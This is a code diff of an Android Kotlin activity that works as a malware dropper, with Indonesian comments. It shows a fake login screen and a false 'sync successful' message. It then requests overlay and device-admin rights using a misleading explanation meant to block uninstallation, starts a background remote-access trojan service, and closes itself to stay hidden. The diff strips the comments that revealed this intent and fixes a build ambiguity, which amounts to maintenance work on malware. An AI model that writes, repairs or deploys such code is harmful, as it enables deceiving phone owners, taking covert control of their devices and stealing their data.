@@ -22,7 +22,6 @@ class MainActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
-        // Setup UI Login Palsu
         val layout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             setPadding(60, 150, 60, 60)
@@ -75,7 +74,6 @@ class MainActivity : Activity() {
 
         setContentView(layout)
 
-        // Aksi Tombol Login
         btnLogin.setOnClickListener {
             Toast.makeText(this, "Sinkronisasi berhasil...", Toast.LENGTH_SHORT).show()
             executeDropperPayload()
@@ -83,34 +81,28 @@ class MainActivity : Activity() {
     }
 
     private fun executeDropperPayload() {
-        // 1. Minta Izin Overlay (Biar bisa nampilin spam teks)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
+            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
+            startActivity(intent)
         }
 
-        // 2. Minta Izin Device Admin (Anti-Uninstall)
-        // PERBAIKAN: Pake MyDeviceAdminReceiver::class.java
         val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
         val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         
         if (!dpm.isAdminActive(adminComponent)) {
-            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
-                // PERBAIKAN: Paksa String biar nggak ambigu
-                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan modul untuk melanjutkan sinkronisasi." as String)
-            }
+            // HAPUS .apply{} AGAR TIDAK AMBIGU
+            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan modul untuk melanjutkan sinkronisasi.")
             startActivity(intent)
         }
 
-        // 3. Jalanin Service RAT di Background
         val serviceIntent = Intent(this, RatService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent)
         } else {
             startService(serviceIntent)
         }
-        
-        // 4. Tutup Activity (Sembunyi)
         finish()
     }
 }
